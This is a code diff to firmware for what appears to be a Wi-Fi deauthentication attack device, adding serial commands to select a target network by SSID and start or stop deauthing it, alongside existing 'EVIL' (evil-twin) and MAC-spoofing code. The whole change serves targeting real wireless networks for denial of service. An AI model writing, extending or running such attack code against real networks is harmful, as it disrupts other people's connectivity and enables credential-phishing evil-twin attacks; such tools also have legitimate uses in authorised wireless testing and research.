@@ -75,6 +75,7 @@ bool secured=false;
 //"00:E0:4C:01:02:03"
 __u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
 bool useCustomMac=false;
+int selected_target_index = -1;
 //int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
 extern u8 rtw_get_band_type(void);
 #define FRAMES_PER_DEAUTH 5
@@ -299,6 +300,7 @@ int scanNetworks(int miliseconds) {
   scan_results.clear();
   DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
   DEBUG_SER_PRINT("scan results cleared...");
+  selected_target_index = -1;
   
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     digitalWrite(LED_B,false);
@@ -484,6 +486,38 @@ void loop() {
         useCustomMac=false;
       }
        
+    }else if(readString.substring(0,13)=="SELECT TARGET"){
+       String target_ssid = readString.substring(14, readString.length()-1);
+       target_ssid.trim();
+       selected_target_index = -1;
+       for(unsigned int i=0; i<scan_results.size(); i++){
+          if(scan_results[i].ssid == target_ssid){
+             selected_target_index = i;
+             Serial.println("SELECTED:"+String(i));
+             Serial1.println("SELECTED:"+String(i));
+             break;
+          }
+       }
+       if(selected_target_index == -1){
+          Serial.println("ERROR:SSID_NOT_FOUND");
+          Serial1.println("ERROR:SSID_NOT_FOUND");
+       }
+
+    }else if(readString.substring(0,12)=="DEAUTH START"){
+       if(selected_target_index != -1 && (unsigned int)selected_target_index < scan_results.size()){
+          deauth_wifis.push_back(selected_target_index);
+          DEBUG_SER_PRINT("Deauthing "+scan_results[selected_target_index].ssid+"\n");
+       }else{
+          Serial.println("ERROR:NO_TARGET_SELECTED");
+          Serial1.println("ERROR:NO_TARGET_SELECTED");
+       }
+
+    }else if(readString.substring(0,11)=="DEAUTH STOP"){
+       DEBUG_SER_PRINT("Stop deauthing\n");
+       deauth_wifis.clear();
+       wifis_temp.clear();
+       digitalWrite(LED_G, 0);
+
     }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
       int numStation;
       if(readString.substring(0,4)=="EVIL"){
